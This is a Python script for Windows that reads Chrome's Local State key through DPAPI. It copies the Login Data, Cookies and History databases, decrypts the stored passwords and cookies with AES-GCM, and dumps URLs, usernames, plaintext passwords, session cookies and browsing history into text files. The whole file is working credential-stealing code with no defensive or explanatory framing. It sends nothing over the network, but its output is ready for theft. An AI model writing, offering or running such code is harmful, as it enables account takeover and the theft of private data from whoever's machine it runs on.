import os
import json
import base64
import sqlite3
import win32crypt
import tabulate
from Cryptodome.Cipher import AES
import shutil


def getKey() -> bytes:
    with open(rf"{os.environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Local State") as f:
        state = json.loads(f.read())
        key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def chipGenerate(aesKey: bytes, vec: bytes):
    return AES.new(aesKey, AES.MODE_GCM, vec)


def payloadDecrypt(cipher, payload: bytes) -> bytes:
    return cipher.decrypt(payload)


def passDecrypt(buff: bytes, key: bytes):
    try:
        cipher = chipGenerate(key, buff[3:15])
        decrypted_pass = payloadDecrypt(cipher, buff[15:])
        return decrypted_pass[:-16].decode()

    except Exception as ex:
        print(ex)
        return False


def resOut(data, name: str) -> None:
    with open(f'{name}.txt', 'w', errors='replace') as f:
        f.write(tabulate.tabulate(data, maxcolwidths=[300, 300]))


def dbWrapper(func):
    def wrapper():
        if func.__name__ == 'getInfo':
            shutil.copy2(rf"{os.environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\default\Login Data",
                         "differ.db")
        elif func.__name__ == 'getHistory':
            shutil.copy2(rf"{os.environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Default\History",
                         "differ.db")
        else:
            shutil.copy2(rf"{os.environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies",
                         "differ.db")

        try:
            con = sqlite3.connect("differ.db")
            cursor = con.cursor()
            func(cursor)
            cursor.close()
            con.close()
        except Exception as ex:
            print(ex)

        finally:
            os.remove("differ.db")

    return wrapper


@dbWrapper
def getInfo(cursor) -> None:
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    data = [['URL', 'NAME', 'PASSWORD']]
    for i in cursor.fetchall():
        url = i[0]
        username = i[1]
        decryptedPass = passDecrypt(i[2], getKey())
        if decryptedPass:
            data.append([url, username, decryptedPass])

    resOut(data, 'Info')


@dbWrapper
def getHistory(cursor) -> None:
    cursor.execute("SELECT title, url FROM urls")
    resOut(cursor.fetchall(), 'History')


@dbWrapper
def getCookie(cursor) -> None:
    cursor.execute("SELECT host_key, name, encrypted_value from cookies")
    data = [['URL', 'NAME', 'COOKIE']]
    for i in cursor.fetchall():
        url = i[0]
        name = i[1]
        cookie = passDecrypt(i[2], getKey())
        if cookie:
            data.append([url, name, cookie])

    resOut(data, 'Cookie')
